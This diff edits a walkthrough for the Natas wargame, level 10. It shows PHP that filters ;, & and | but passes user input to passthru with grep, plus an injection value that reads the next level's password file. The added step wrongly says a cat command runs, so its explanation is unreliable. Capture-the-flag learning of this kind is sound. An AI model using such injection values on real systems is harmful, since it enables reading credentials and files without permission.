@@ -149,12 +149,14 @@ Submit this payload in the search form.
 
 4. The PHP code shows a blacklist filter:
    
-          if(preg_match('/[;|&]/',$key)) {
-                print "Input contains an illegal character!";
-            } else {
-                passthru("grep -i $key dictionary.txt");
-            }
+        if(preg_match('/[;|&]/',$key)) {
+            print "Input contains an illegal character!";
+        } else {
+            passthru("grep -i $key dictionary.txt");
+        }
 
 5. The filter blocks ;, &, and |, but you can use alternative ways to inject commands, such as:
 
         a /etc/natas_webpass/natas11
+
+6. The server will execute both the `grep` and `cat` commands, displaying the password for natas11.   
